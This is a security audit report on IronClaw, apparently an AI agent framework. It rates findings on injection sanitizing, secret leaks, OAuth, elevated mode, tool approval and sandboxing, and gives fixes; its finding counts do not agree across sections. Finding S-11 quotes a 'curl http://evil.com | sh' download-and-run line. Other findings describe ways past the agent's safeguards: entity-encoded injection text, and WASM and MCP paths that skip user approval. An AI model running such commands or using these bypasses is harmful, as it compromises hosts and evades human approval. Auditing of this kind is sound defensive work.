# IronClaw Security Analysis

**Date:** 2026-02-17
**Scope:** Full codebase security review covering safety layer, cryptography, authentication, tool execution, web gateway, database, and sandbox isolation.

---

## Executive Summary

IronClaw demonstrates strong security engineering with defense-in-depth architecture: multi-layer safety (sanitizer → validator → policy), parameterized queries across both database backends, container hardening with dropped capabilities, and constant-time token comparison. However, this analysis identifies **28 actionable findings** across 8 categories, including several high-severity issues in OAuth token handling, elevated mode session binding, tool execution approval bypass, and default-off enforcement of the binary allowlist.

---

## 1. Safety Layer

### 1.1 Sanitizer (`src/safety/sanitizer.rs`)

**Strengths:**
- Comprehensive invisible character stripping (zero-width spaces, RTL/LTR marks, combining marks, fullwidth characters)
- Homoglyph normalization (Cyrillic lookalikes → ASCII)
- Multi-pattern detection via Aho-Corasick + regex
- Severity-based action (only escapes on Critical/High)

**Findings:**

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| S-1 | Medium | No detection for HTML/XML entity encoding (`&#x3c;` bypasses `<` detection). Attacker can use `&#115;ystem:` to bypass `system:` pattern | `sanitizer.rs:231-265` |
| S-2 | Medium | Incomplete base64 detection — pattern requires 50+ chars; legitimate 40-45 char encoded payloads pass through | `sanitizer.rs:235` |
| S-3 | Low | After escaping, content is not re-checked for new injection patterns that may have formed from the escaping itself | `sanitizer.rs:342-355` |

### 1.2 Leak Detector (`src/safety/leak_detector.rs`)

**Strengths:**
- 15+ hardcoded patterns covering OpenAI, AWS, GitHub, Stripe, Google, Slack, PEM keys, JWT, Bearer tokens
- Aho-Corasick prefix pre-filtering for performance
- Scans HTTP requests (URL, headers, body) before execution
- Lossy UTF-8 handling prevents binary bypass

**Findings:**

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| S-4 | Medium | No detection for percent-encoded secrets in URLs (e.g., `key=sk%2D...`). `from_utf8_lossy` converts bytes but patterns expect raw format | `leak_detector.rs:291-317` |
| S-5 | Medium | Only matches SHA256-length (64 char) high-entropy hex; SHA384 (96) and SHA512 (128) hashes not detected | `leak_detector.rs:534-539` |
| S-6 | Medium | Header scanning is case-sensitive but HTTP headers are case-insensitive per RFC 7230 | `leak_detector.rs:301` |
| S-7 | Low | `add_pattern()` at runtime doesn't rebuild the prefix matcher — new patterns won't benefit from optimization | `leak_detector.rs:322` |

### 1.3 Validator (`src/safety/validator.rs`)

**Strengths:**
- Null byte detection, whitespace ratio detection, JSON nesting depth limit (32)
- Excessive repetition warning

**Findings:**

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| S-8 | Low | No Unicode normalization before whitespace checks — fullwidth spaces may evade detection | `validator.rs:119-188` |
| S-9 | Low | Default `forbidden_patterns` set is empty; must be explicitly filled. Default behavior has zero forbidden patterns | `validator.rs:86` |

### 1.4 Policy (`src/safety/policy.rs`)

**Strengths:**
- System file access blocking (`/etc/passwd`, `/etc/shadow`, `.ssh/`, `.aws/`, `.env`)
- Shell injection, SQL injection, and crypto key detection
- Base64 payload detection

**Findings:**

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| S-10 | Medium | No detection for path traversal variants (`..\/`, `\u002e\u002e/`, null byte paths like `/etc/passwd\0.txt`) | `policy.rs:135-142` |
| S-11 | Medium | Shell injection pattern requires `;` or `&&` or `||` prefix; `curl http://evil.com \| sh` with space-only prefix may bypass | `policy.rs:166` |

### 1.5 Cross-Cutting Safety Concerns

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| S-12 | High | Setting `injection_check_enabled=false` via config globally disables all injection detection. No confirmation required | `src/safety/mod.rs:119-129` |
| S-13 | Medium | No centralized audit log — each safety component logs independently; correlating security events requires manual aggregation | All safety modules |
| S-14 | Medium | No circuit breaker for repeated failures — attacker can probe indefinitely with no exponential backoff or temporary lockout | All safety modules |
| S-15 | Low | Unbounded glob recursion in ACL matching — pattern `*****...` against long strings can cause stack overflow | `src/safety/allowlist.rs:122-155` |

---

## 2. Secrets Management & Cryptography

### Strengths

- Industry-standard **AES-256-GCM** authenticated encryption (`src/secrets/crypto.rs:17-18`)
- Per-secret key derivation via **HKDF-SHA256** with unique random salts (`crypto.rs:73,141`)
- Fresh 12-byte nonce per secret via `OsRng` (`crypto.rs:85`)
- `secrecy::SecretString` for all sensitive values with automatic memory zeroing on drop
- OS keychain integration (macOS Keychain Services, Linux secret-service) for master key storage
- `DecryptedSecret` has redacted Debug output — never logged/serialized

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| C-1 | High | OAuth `client_secret` stored as plain `String`, not `SecretString`. If `OAuthConfig` is serialized (it derives `Serialize`), the secret is exposed | `src/safety/oauth.rs:26` |
| C-2 | High | `OAuthTokens` holds `access_token`/`refresh_token` as plain `String` with auto-derived `Debug` — any `{:?}` log format exposes tokens | `oauth.rs:46-55` |
| C-3 | High | OAuth tokens stored in plaintext `Arc<Mutex<HashMap<String, OAuthTokens>>>` — process memory dump exposes all tokens | `oauth.rs:136` |
| C-4 | Medium | PKCE verifier stored as plain `String` in `PkceChallenge`, not protected during transmission or storage | `oauth.rs:93` |
| C-5 | Medium | `DecryptedSecret` Clone implementation creates temporary `String` via `expose_secret().to_string()` that may not be immediately zeroed | `src/secrets/types.rs:128` |
| C-6 | Low | OAuth state parameter uses `rand::thread_rng()` while PKCE verifier correctly uses `OsRng` — inconsistent RNG usage for security tokens | `oauth.rs:163` |

---

## 3. Authentication & Authorization

### Strengths

- Web gateway uses `subtle::ConstantTimeEq` for Bearer token comparison (`src/channels/web/auth.rs:31`)
- Orchestrator uses per-job cryptographically random 32-byte bearer tokens, in-memory only (`src/orchestrator/auth.rs:36-40`)
- OAuth PKCE (RFC 7636, S256 challenge method) prevents authorization code interception
- CSRF protection via random 32-char state parameter on OAuth flows

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| A-1 | High | SSE query-string token not URL-decoded before constant-time comparison. `?token=ABC%20DEF` won't match `ABC DEF`. Auth bypass if tokens contain special characters | `src/channels/web/auth.rs:37-42` |
| A-2 | High | `ElevatedMode.activate()` accepts any `user_id` string without cryptographic verification. Elevation is global — shared across all sessions for that user | `src/safety/elevated.rs:42-46` |
| A-3 | High | Setting `duration_secs = 0` makes elevated mode **permanent** until explicit `deactivate()` with no safety check | `elevated.rs:68-69` |
| A-4 | Medium | Web gateway token generated with `rand::thread_rng()`, not `OsRng`. 32 alphanumeric chars (~190 bits) adequate but not best practice for auth tokens | `src/channels/web/mod.rs:69-76` |
| A-5 | Medium | `GroupPolicyManager.check_tool_allowed()` exists but **no callers found** in the tool execution path — group policies are defined but never enforced | `src/safety/group_policies.rs:141-178` |
| A-6 | Medium | Device pairing uses 6-digit codes (900K values) with rate limit per-channel, not per-device. Brute-force feasible across multiple devices | `src/pairing/device.rs:273-278`, `store.rs:306-318` |
| A-7 | Medium | Orchestrator tokens have no TTL — if job crashes/hangs, token remains valid indefinitely | `src/orchestrator/auth.rs:23-26` |
| A-8 | Low | OAuth `cleanup_expired_flows()` not automatically triggered — pending states can persist indefinitely if cleanup isn't scheduled | `oauth.rs:380-382` |

---

## 4. Tool Execution Security

### Strengths

- Shell tool passes commands via `Command::new("sh").args(["-c", cmd])` — proper argument passing
- Comprehensive dangerous command blocklist with separate `NEVER_AUTO_APPROVE_PATTERNS` (`src/tools/builtin/shell.rs:42-116`)
- HTTP tool enforces HTTPS-only, blocks localhost, detects DNS rebinding with fail-closed pattern (`src/tools/builtin/http.rs:35-118`)
- File tool: lexical path normalization, symlink-aware validation, workspace file write protection (`src/tools/builtin/file.rs:53-149`)
- Tool registry prevents shadowing protected built-in tool names (`src/tools/registry.rs:32-65`)
- WASM tools: fresh instance per execution, minimal WASI context, rate-limited (50 HTTP requests, 20 tool invocations per execution)

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| T-1 | High | WASM `tool_invoke` capability allows calling aliased tools without passing through the approval system. A WASM tool with this capability can invoke `shell` bypassing user approval | `src/tools/wasm/host.rs:275-289` |
| T-2 | Medium | Shell dangerous-pattern detection uses simple substring matching. Obfuscation via full paths (`/bin/rm -rf /`), extra whitespace, or newline injection can bypass | `shell.rs:122-127` |
| T-3 | Medium | MCP tool approval relies on server's `destructive_hint` annotation. A malicious MCP server can declare destructive tools as non-destructive | `src/tools/mcp/client.rs:245-250` |
| T-4 | Medium | Shell tool falls back to direct host execution when sandbox is unavailable. The tool's `domain()` returns `Container` suggesting sandboxed execution, but fallback bypasses Docker | `shell.rs:354-356` |
| T-5 | Medium | `SandboxPolicy::FullAccess` completely bypasses Docker isolation by calling `execute_direct()` | `src/sandbox/manager.rs:207-209` |
| T-6 | Low | DNS rebinding TOCTOU: HTTP tool validates DNS once at check time, but `reqwest` re-resolves at request time. Short-TTL records could change between validation and execution | `http.rs:65-95` |
| T-7 | Low | WASM credential placeholder uses simple string replacement (`{GOOGLE_ACCESS_TOKEN}`) — if tool source contains the literal placeholder, it gets replaced with the actual credential | `src/tools/wasm/wrapper.rs:80-96` |

---

## 5. Web Gateway Security

### Strengths

- Security headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, CSP with strict defaults (`src/channels/web/server.rs:301-321`)
- Path traversal protection with canonicalization in file handlers (`server.rs:1492-1501, 1564-1572, 1773-1802`)
- Sliding window rate limiter with atomic CAS operations (`server.rs:49-121`)
- WebSocket origin validation against localhost/127.0.0.1 (`server.rs:587-616`)
- User ownership verification on conversations, jobs, and routines (prevents IDOR)
- Frontend HTML sanitization removes `<script>`, `<iframe>`, event handlers, dangerous URL schemes (`app.js:281-330`)

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| W-1 | Medium | No CSRF token protection on state-changing endpoints (POST/PUT/DELETE). CORS + auth token provide partial mitigation | `server.rs:186-232` |
| W-2 | Medium | CSP allows `'unsafe-inline'` for both `script-src` and `style-src`, reducing CSP effectiveness | `server.rs:319` |
| W-3 | Medium | Auth token stored in `sessionStorage` — vulnerable to XSS-based theft. HttpOnly cookie with Secure+SameSite flags would be more robust | `app.js:28, 63` |
| W-4 | Low | No rate limiting on `/api/memory/search`, `/api/jobs`, `/api/routines` endpoints — enumeration possible | `server.rs:940-1094` |
| W-5 | Low | Inline `onclick` handlers use string concatenation (`escapeHtml` applied but attribute injection still possible) | `app.js:1015` |

---

## 6. Database Security

### Strengths

- **100% parameterized queries** across both PostgreSQL and libSQL backends — no string interpolation in SQL
- User isolation enforced via `user_id` WHERE clauses on all queries
- Ownership check methods (`conversation_belongs_to_user`, `sandbox_job_belongs_to_user`)
- Compile-time embedded migrations via `refinery::embed_migrations!()`
- Encrypted credential storage with AES-256-GCM (per `V2__wasm_secure_api.sql`)
- Generic error messages that don't expose SQL details to clients

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| D-1 | Low | LIKE metacharacters (`%`, `_`) not escaped in directory path patterns for libSQL `list_directory` query. Impact limited by user_id filtering | `src/db/libsql_backend.rs:2125-2147` |

---

## 7. Sandbox & Container Isolation

### Strengths

- All Linux capabilities dropped (`cap_drop: ["ALL"]`), only `CHOWN` re-added (`src/sandbox/container.rs:286`)
- `no-new-privileges:true` security option prevents privilege escalation (`container.rs:289`)
- Non-root execution (UID 1000) with read-only root filesystem for ReadOnly policy
- Network proxy with domain allowlist, CONNECT tunneling blocked, redirects disabled
- SSRF protection: raw IP literals rejected, private IP ranges blocked (RFC 1918, loopback, link-local, CGNAT, cloud metadata endpoints)
- Credential injection via allowlist-only `EnvCredentialResolver` — prevents arbitrary env var exfiltration
- Per-job bearer tokens: cryptographically random, constant-time comparison, job-scoped, in-memory only
- Host `/tmp` mount explicitly avoided

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| X-1 | High | Binary allowlist `enforced: false` by default. When not explicitly enabled, all binaries are permitted in the sandbox | `src/safety/bins_allowlist.rs:87` |
| X-2 | Medium | On Linux, orchestrator API binds to `0.0.0.0:{port}` (all interfaces). Security depends entirely on bearer token validation — no network-level isolation | `src/orchestrator/api.rs:83-96` |
| X-3 | Medium | Docker bridge network mode (`"bridge"`) allows inter-container communication unless ICC is disabled at the daemon level. Cannot be restricted per-container | `container.rs:282-284` |
| X-4 | Low | No validation that callers of `execute_with_policy()` don't inject extra environment variables containing secrets | `src/orchestrator/job_manager.rs:209-260` |

---

## 8. Log Redaction (`src/safety/log_redaction.rs`)

### Strengths

- Zero-copy fast path when no patterns match (returns `Cow::Borrowed`)
- Covers API keys, Bearer tokens, JWTs, emails, passwords in URLs, context-aware hex secrets

### Findings

| ID | Severity | Description | Location |
|----|----------|-------------|----------|
| L-1 | Medium | No detection for base64-encoded credentials, PEM key content (full blocks), database connection strings with embedded auth | `log_redaction.rs` |
| L-2 | Medium | Pattern evaluation order matters — if JWT contains `@`, both JWT and email patterns could match; last replacement wins, potentially leaving partial secrets | `log_redaction.rs:98-107` |
| L-3 | Low | No detection for session cookies in Set-Cookie headers, OAuth state parameters, or uncontextualized 32+ hex strings | `log_redaction.rs` |

---

## Priority Recommendations

### Immediate (High Severity)

1. **Fix SSE auth token URL decoding** (A-1): URL-decode query parameter before constant-time comparison in `src/channels/web/auth.rs:37-42`
2. **Protect OAuth tokens** (C-1, C-2, C-3): Use `SecretString` for `client_secret`, `access_token`, `refresh_token`. Implement custom `Debug` that redacts. Remove `Serialize` derive from `OAuthTokens`
3. **Enable binary allowlist by default** (X-1): Change `enforced: false` to `enforced: true` in `bins_allowlist.rs:87` constructor
4. **Bind elevated mode to sessions** (A-2, A-3): Add session ID to `ElevatedMode`, validate duration > 0, require authentication before `activate()`
5. **Add approval check to WASM tool_invoke** (T-1): Re-check `requires_approval()` on nested tool invocations in `host.rs:275-289`
6. **Disable injection check toggle without confirmation** (S-12): Require explicit confirmation or startup flag to disable injection checking

### Short-Term (Medium Severity)

7. **Add URL percent-encoding detection** to leak detector (S-4)
8. **Add entity encoding detection** to sanitizer (S-1)
9. **Enforce group policies** in tool execution path (A-5) — wire `check_tool_allowed()` into the worker
10. **Add TTL to orchestrator tokens** (A-7) — expire after configurable timeout (5-10 min recommended)
11. **Use `OsRng` consistently** for all security tokens: gateway auth token (A-4), OAuth state (C-6)
12. **Remove `unsafe-inline`** from CSP (W-2) and use nonces for inline scripts
13. **Move auth token to HttpOnly cookie** (W-3) with Secure and SameSite=Strict
14. **Add CSRF tokens** to state-changing web endpoints (W-1)
15. **Escape LIKE metacharacters** in libSQL directory queries (D-1)
16. **Add path traversal variant detection** to policy (S-10) — handle `..\/`, Unicode escapes, null bytes
17. **Document orchestrator port 50051** security requirements (X-2) — add firewall guidance to deployment docs

### Long-Term (Low Severity / Hardening)

18. Add centralized audit logging across all safety components (S-13)
19. Implement circuit breaker / exponential backoff for repeated safety failures (S-14)
20. Add recursion depth limit to glob matching in ACL (S-15)
21. Add ReDoS prevention (timeout/iteration limit) to regex matching
22. Support runtime pattern updates for safety rules without redeployment
23. Add rate limiting to memory search and job query endpoints (W-4)
24. Replace inline onclick handlers with event listeners (W-5)
25. Add SHA384/SHA512 detection to leak detector (S-5)
26. Make header scanning case-insensitive in leak detector (S-6)
27. Validate ICC=false in Docker daemon configuration at startup (X-3)
28. Implement automatic OAuth flow cleanup on a background timer (A-8)

---

## Risk Summary

| Category | High | Medium | Low | Overall |
|----------|------|--------|-----|---------|
| Safety Layer | 1 | 5 | 3 | Medium |
| Cryptography | 3 | 2 | 1 | High |
| Authentication | 3 | 4 | 1 | High |
| Tool Execution | 1 | 3 | 2 | Medium |
| Web Gateway | 0 | 3 | 2 | Medium |
| Database | 0 | 0 | 1 | Low |
| Sandbox | 1 | 2 | 1 | Medium |
| Log Redaction | 0 | 2 | 1 | Low |
| **Total** | **9** | **21** | **12** | **Medium-High** |

---

## Conclusion

IronClaw's security architecture is fundamentally sound — the defense-in-depth design, consistent use of parameterized queries, proper container hardening, and constant-time token comparison demonstrate mature security engineering. The most critical improvements needed are:

1. **OAuth token handling** — the secrets vault uses best-practice crypto, but OAuth tokens bypass it entirely and sit in plaintext memory with auto-derived `Debug`/`Serialize`
2. **Elevated mode session binding** — currently global across all sessions for a user
3. **Default-off enforcement** — binary allowlist and injection checking can be silently disabled
4. **WASM tool_invoke approval bypass** — nested tool invocations skip the approval gate

Most findings are implementation details rather than architectural flaws, and the codebase is well-positioned for incremental hardening.
